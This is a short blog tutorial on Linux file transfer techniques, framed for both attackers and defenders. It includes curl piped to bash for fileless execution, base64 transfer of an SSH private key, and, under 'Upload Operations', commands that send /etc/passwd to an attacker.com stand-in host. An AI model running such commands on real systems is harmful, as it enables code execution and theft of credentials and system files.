---
title: "Linux File Transfer Methods"
date: 2025-03-16 12:00:00 +0000
categories: [Linux, Security]
tags: [File Transfer, Offensive Security, Incident Response]
description: "Exploring various methods to transfer files in Linux, from traditional tools to fileless techniques."
#image: "/assets/images/linux-file-transfer.png"
---

## Introduction

Understanding file transfer methods in Linux is crucial for both attackers and defenders. Threat actors often exploit various transfer techniques to deploy malware, while security professionals use them to detect and mitigate attacks.

This post explores multiple ways to transfer files in Linux, including network-based and fileless methods.

## **Common File Transfer Techniques**

### **1. Base64 Encoding/Decoding**
If network access is restricted, files can be encoded in Base64, copied as text, and then decoded on the target machine.
```bash
# Encode a file
cat id_rsa | base64 -w 0

# Decode the file on the target machine
echo 'encoded_string' | base64 -d > id_rsa
```

### **2. Web-Based Downloads**
Using `wget` and `curl`, files can be fetched from a remote server:
```bash
# Using wget
wget https://example.com/file.sh -O /tmp/file.sh

# Using curl
curl -o /tmp/file.sh https://example.com/file.sh
```
For fileless execution, commands can be piped:
```bash
curl https://example.com/script.sh | bash
```

### **3. Bash `/dev/tcp` Transfers**
If common tools are unavailable, Bash can be used to fetch files via raw TCP connections:
```bash
exec 3<>/dev/tcp/target_ip/80
echo -e "GET /file.sh HTTP/1.1\n\n" >&3
cat <&3
```

### **4. SSH & SCP Transfers**
Using SSH, files can be securely transferred between systems:
```bash
# Download a file from a remote machine
scp user@remote:/path/to/file .

# Upload a file to a remote machine
scp file.txt user@remote:/home/user/
```

### **5. Python, PHP, and Ruby Web Servers**
If a compromised machine has Python, PHP, or Ruby, a quick web server can be started:
```bash
# Python 3 Web Server
python3 -m http.server 8000

# PHP Web Server
php -S 0.0.0.0:8000
```
The file can then be retrieved from another machine:
```bash
wget http://target_ip:8000/file.txt
```

## **Upload Operations**
For exfiltrating files from a target, `curl` can be used to upload via a malicious server:
```bash
curl -X POST https://attacker.com/upload -F 'file=@/etc/passwd' --insecure
```
Alternatively, `scp` can be used:
```bash
scp /etc/passwd user@attacker:/tmp/
```

## **Conclusion**
Understanding Linux file transfer techniques is essential for security professionals. Whether downloading, uploading, or performing fileless execution, knowing these methods enhances both attack and defense strategies.

Stay informed and practice ethical security techniques to protect your systems!

